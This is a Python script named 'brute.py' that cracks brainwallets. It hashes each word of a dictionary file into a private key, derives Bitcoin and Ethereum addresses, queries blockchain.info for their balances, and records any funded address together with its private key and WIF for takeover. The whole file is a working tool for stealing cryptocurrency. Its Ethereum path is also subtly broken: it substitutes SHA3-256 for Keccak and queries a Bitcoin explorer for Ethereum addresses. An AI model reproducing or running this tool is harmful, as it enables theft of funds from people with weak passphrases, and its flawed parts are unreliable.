#!/usr/bin/env python3
# brute.py (modified)
# Only BTC P2PKH (1...) and Ethereum addresses; default dictionary.txt -> found.txt
from __future__ import annotations
import io, sys, logging, time, binascii, hashlib, json, os, random
import requests

# crypto libs
try:
    import ecdsa
    import base58
except Exception as e:
    print("Missing dependencies. Install: pip3 install requests ecdsa base58")
    raise

# optional coincurve for taproot (we won't use p2tr here, but keep flag)
try:
    import coincurve
    HAVE_COINCURVE = True
except Exception:
    HAVE_COINCURVE = False

# try to get keccak_256
try:
    from sha3 import keccak_256
except Exception:
    # fallback to hashlib.sha3_256 (not exact Keccak but a fallback if pysha3 not installed)
    try:
        keccak_256 = lambda b=b'': hashlib.sha3_256(b)
    except Exception:
        keccak_256 = None

# --- minimal bech32 / segwit helpers (unchanged) ---
CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"
def bech32_polymod(values):
    GENERATORS = [0x3b6a57b2, 0x26508e6d, 0x1ea119fa, 0x3d4233dd, 0x2a1462b3]
    chk = 1
    for v in values:
        top = chk >> 25
        chk = ((chk & 0x1ffffff) << 5) ^ v
        for i in range(5):
            if ((top >> i) & 1):
                chk ^= GENERATORS[i]
    return chk

def bech32_hrp_expand(hrp):
    return [ord(x) >> 5 for x in hrp] + [0] + [ord(x) & 31 for x in hrp]

def bech32_create_checksum(hrp, data, spec='bech32'):
    const = 1 if spec == 'bech32' else 0x2bc830a3
    values = bech32_hrp_expand(hrp) + data
    polymod = bech32_polymod(values + [0]*6) ^ const
    return [(polymod >> 5 * (5 - i)) & 31 for i in range(6)]

def bech32_encode(hrp, data, spec='bech32'):
    combined = data + bech32_create_checksum(hrp, data, spec=spec)
    return hrp + '1' + ''.join([CHARSET[d] for d in combined])

def convertbits(data, frombits, tobits, pad=True):
    acc = 0; bits = 0; ret = []; maxv = (1 << tobits) - 1
    for value in data:
        if value < 0 or (value >> frombits):
            return None
        acc = (acc << frombits) | value
        bits += frombits
        while bits >= tobits:
            bits -= tobits
            ret.append((acc >> bits) & maxv)
    if pad:
        if bits:
            ret.append((acc << (tobits - bits)) & maxv)
    elif bits >= frombits or ((acc << (tobits - bits)) & maxv):
        return None
    return ret

def segwit_addr_encode(hrp, witver, witprog):
    if witver < 0 or witver > 16 or len(witprog) < 2 or len(witprog) > 40:
        return None
    data = [witver] + convertbits(list(witprog), 8, 5)
    spec = 'bech32' if witver == 0 else 'bech32m'
    return bech32_encode(hrp, data, spec=spec)

# ------------------ Wallet (no coinkit) ------------------
class Wallet:
    """
    Wallet(passphrase, is_private_key=False)
    - if is_private_key: accepts hex privkey or WIF
    - else: SHA256(passphrase) -> priv key
    Exposes:
      - private_key (hex)
      - wif
      - addresses dict: p2pkh, eth
    """
    def __init__(self, passphrase, is_private_key=False):
        self.passphrase = passphrase
        self.is_private_key = bool(is_private_key)
        if self.is_private_key:
            if self._looks_like_hex(self.passphrase):
                self.private_key = self.passphrase.lower()
            else:
                self.private_key = self._wif_to_hex(self.passphrase)
        else:
            # derive from passphrase
            self.private_key = binascii.hexlify(hashlib.sha256(self.passphrase.encode('utf-8')).digest()).decode()
        self.wif = self._hex_to_wif(self.private_key)
        # compressed pubkey for BTC
        self.pubkey_compressed = self._priv_to_compressed_pubkey(self.private_key)
        # uncompressed pubkey for ETH derivation
        self.pubkey_uncompressed = self._priv_to_uncompressed_pubkey(self.private_key)
        self.addresses = {}
        # only P2PKH (1...) for BTC
        self.addresses['p2pkh'] = self._p2pkh_from_pubkey(self.pubkey_compressed)
        # derive ethereum address
        self.addresses['eth'] = self._eth_address_from_uncompressed(self.pubkey_uncompressed)

    def _looks_like_hex(self, s):
        try:
            int(s, 16)
            return len(s) in (64, 66)
        except Exception:
            return False

    def _hex_to_wif(self, priv_hex, compressed=True):
        b = binascii.unhexlify(priv_hex)
        payload = b'\x80' + b
        if compressed:
            payload += b'\x01'
        checksum = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
        return base58.b58encode(payload + checksum).decode()

    def _wif_to_hex(self, wif):
        try:
            raw = base58.b58decode(wif)
            payload = raw[:-4]
            if len(payload) == 34 and payload[-1] == 0x01:
                key = payload[1:-1]
            else:
                key = payload[1:]
            return binascii.hexlify(key).decode()
        except Exception:
            return ""

    def _priv_to_compressed_pubkey(self, priv_hex):
        priv = binascii.unhexlify(priv_hex)
        sk = ecdsa.SigningKey.from_string(priv, curve=ecdsa.SECP256k1)
        vk = sk.get_verifying_key()
        px = vk.to_string()
        x = px[:32]; y = px[32:]
        prefix = b'\x02' if (y[-1] % 2 == 0) else b'\x03'
        return prefix + x

    def _priv_to_uncompressed_pubkey(self, priv_hex):
        priv = binascii.unhexlify(priv_hex)
        sk = ecdsa.SigningKey.from_string(priv, curve=ecdsa.SECP256k1)
        vk = sk.get_verifying_key()
        px = vk.to_string()
        # uncompressed prefix 0x04 + x + y
        return b'\x04' + px

    def _hash160(self, data_bytes):
        return hashlib.new('ripemd160', hashlib.sha256(data_bytes).digest()).digest()

    def _p2pkh_from_pubkey(self, pubkey_bytes):
        rip = self._hash160(pubkey_bytes)
        pref = b'\x00' + rip
        checksum = hashlib.sha256(hashlib.sha256(pref).digest()).digest()[:4]
        return base58.b58encode(pref + checksum).decode()

    def _p2wpkh_bech32(self, pubkey_bytes):
        witprog = self._hash160(pubkey_bytes)
        return segwit_addr_encode("bc", 0, witprog)

    def _p2sh_p2wpkh(self, pubkey_bytes):
        witprog = self._hash160(pubkey_bytes)
        redeem = b'\x00\x14' + witprog
        redeem_hash = hashlib.new('ripemd160', hashlib.sha256(redeem).digest()).digest()
        pref = b'\x05' + redeem_hash
        checksum = hashlib.sha256(hashlib.sha256(pref).digest()).digest()[:4]
        return base58.b58encode(pref + checksum).decode()

    def _eth_address_from_uncompressed(self, uncompressed_pub):
        # uncompressed_pub: b'\x04' + x (32) + y (32)
        if not uncompressed_pub or len(uncompressed_pub) != 65:
            return None
        pub_bytes = uncompressed_pub[1:]  # x||y
        if keccak_256 is None:
            return None
        h = keccak_256(pub_bytes).hexdigest()
        return "0x" + h[-40:]

    def __repr__(self):
        return "<Wallet priv=%s addr_p2pkh=%s eth=%s>" % (self.private_key[:8], self.addresses.get('p2pkh'), self.addresses.get('eth'))

# ------------------ BaseBlockExplorer & concrete classes (unchanged except kept here) ------------------

class BaseBlockExplorer(object):
    def __init__(self):
        self.session = None
        self._base_url = None
        self._base_url_received = None
        self._base_url_balance = None
        self._received_suffix = ''
        self._balance_suffix = ''

    def open_session(self):
        logging.info("Opening new session")
        self.session = requests.Session()
        return

    def close_session(self):
        logging.debug("Closing session")
        if self.session:
            try:
                self.session.close()
            except Exception:
                pass
        self.session = None

    def _get(self, url, timeout=15):
        r = self.session.get(url, timeout=timeout)
        r.raise_for_status()
        return r

    def _parse_numeric_from_response(self, response):
        text = response.text.strip()
        try:
            return float(text)
        except Exception:
            pass
        try:
            j = response.json()
            for key in ("total_received", "totalReceived", "final_balance", "finalBalance", "balance", "received"):
                v = None
                if isinstance(j, dict):
                    v = j.get(key)
                if v is not None:
                    return float(v)
            if isinstance(j, dict) and "data" in j:
                try:
                    inner = next(iter(j["data"].values()))
                    if isinstance(inner, dict):
                        addr = inner.get("address", {})
                        for k in ("received", "balance"):
                            if k in addr:
                                return float(addr.get(k))
                except Exception:
                    pass
        except Exception:
            pass
        raise Exception("Unable to parse numeric from response: " + text[:200])

    def get_received(self, public_address):
        if not self.session:
            raise Exception("open_session first")
        url = "{}/{}{}".format(self._base_url_received, public_address, self._received_suffix)
        r = self._get(url)
        num = self._parse_numeric_from_response(r)
        return num

    def get_balance(self, public_address):
        if not self.session:
            raise Exception("open_session first")
        url = "{}/{}{}".format(self._base_url_balance, public_address, self._balance_suffix)
        r = self._get(url)
        num = self._parse_numeric_from_response(r)
        return num

    @staticmethod
    def text_to_float(text):
        try:
            return float(text)
        except Exception:
            raise

    @staticmethod
    def satoshi_to_btc(value):
        try:
            return float(value) / 100000000.0
        except Exception:
            raise

class BlockchainInfo(BaseBlockExplorer):
    STRING_TYPE = "blockchaininfo"
    def __init__(self):
        super().__init__()
        self._api_limit_seconds = 1
        logging.info("Note: sleeping %s seconds before blockchain.info calls to avoid rate limits", self._api_limit_seconds)
        self._base_url = "https://blockchain.info"
        self._base_url_received = "{}/q/getreceivedbyaddress".format(self._base_url)
        self._base_url_balance = "{}/q/addressbalance".format(self._base_url)

    def get_received(self, public_address):
        time.sleep(self._api_limit_seconds)
        val = super().get_received(public_address)
        return self.satoshi_to_btc(val)

    def get_balance(self, public_address):
        time.sleep(self._api_limit_seconds)
        val = super().get_balance(public_address)
        return self.satoshi_to_btc(val)

# ------------------ Main scanning CLI (simplified default filenames, no flags) ------------------

def main():
    # defaults (no CLI flags)
    dict_path = "dictionary.txt"
    out_path = "found.txt"

    # simple logging to DEBUG by env var if desired
    debug = os.environ.get("BRUTE_DEBUG", "") != ""
    logging.basicConfig(level=logging.DEBUG if debug else logging.INFO,
                        format='%(asctime)s %(levelname)-6s %(message)s')

    explorer = BlockchainInfo()
    explorer.open_session()

    # Validate dict file
    try:
        with io.open(dict_path, 'rt', encoding='utf-8') as f:
            f.read(4096)
    except Exception as e:
        print("Failed to open dict file %s : %s" % (dict_path, e))
        sys.exit(1)
    f_dictionary = io.open(dict_path, 'rt', encoding='utf-8')

    try:
        fout = open(out_path, 'w', encoding='utf-8')
        fout.write('dictionary_word,address_type,address,received_btc,private_hex,wif,current_balance_btc\n')
    except Exception as e:
        print("Failed to open output file %s : %s" % (out_path, e))
        sys.exit(1)

    # Loop
    for raw in f_dictionary:
        word = raw.rstrip()
        if not word:
            continue
        # clean line-by-line print
        print("processing:", word)
        try:
            wallet = Wallet(word, is_private_key=False)
        except Exception as e:
            print("warning: failed to create wallet for '%s': %s" % (word, e))
            continue

        # only check p2pkh and eth in that order
        for atype in ("p2pkh", "eth"):
            addr = wallet.addresses.get(atype)
            if not addr:
                print("skipping: %s no address for type %s" % (word, atype))
                continue

            # get received with retries/backoff
            retry = 0
            max_retries = 4
            backoff = 1.0
            received = 0.0
            while retry < max_retries:
                try:
                    received_raw = explorer.get_received(addr)
                    if received_raw > 1000000000:
                        received = float(received_raw) / 1e8
                    elif received_raw > 1 and received_raw < 1000000000:
                        if float(received_raw).is_integer():
                            received = float(received_raw) / 1e8
                        else:
                            received = float(received_raw)
                    else:
                        received = float(received_raw)
                    break
                except Exception as e:
                    retry += 1
                    sleep = backoff * (2 ** (retry-1)) * (0.5 + random.random())
                    print("error fetching received for %s (%s): %s — retry %d/%d sleeping %.2fs" %
                          (addr, atype, e, retry, max_retries, sleep))
                    time.sleep(sleep)
            if retry == max_retries:
                print("Giving up fetching received for %s (%s)" % (addr, atype))
                continue

            if received == 0:
                # polite sleep to avoid hammering
                time.sleep(0.06)
                continue

            # get balance
            retry = 0
            balance = 0.0
            while retry < max_retries:
                try:
                    balance_raw = explorer.get_balance(addr)
                    if balance_raw > 1000000000:
                        balance = float(balance_raw) / 1e8
                    elif balance_raw > 1 and balance_raw < 1000000000:
                        if float(balance_raw).is_integer():
                            balance = float(balance_raw) / 1e8
                        else:
                            balance = float(balance_raw)
                    else:
                        balance = float(balance_raw)
                    break
                except Exception as e:
                    retry += 1
                    sleep = backoff * (2 ** (retry-1)) * (0.5 + random.random())
                    print("error fetching balance for %s (%s): %s — retry %d/%d sleeping %.2fs" %
                          (addr, atype, e, retry, max_retries, sleep))
                    time.sleep(sleep)
            if retry == max_retries:
                print("Giving up fetching balance for %s (%s)" % (addr, atype))
                continue

            out_line = "{word},{atype},{addr},{received:.8f},{priv},{wif},{balance:.8f}".format(
                word=word, atype=atype, addr=addr,
                received=received, priv=wallet.private_key, wif=wallet.wif, balance=balance)
            # print clean line and write to file
            print("FOUND:", out_line)
            fout.write(out_line + '\n'); fout.flush()
            time.sleep(0.06)

    explorer.close_session()
    fout.close()
    f_dictionary.close()
    print("Done.")

if __name__ == '__main__':
    main()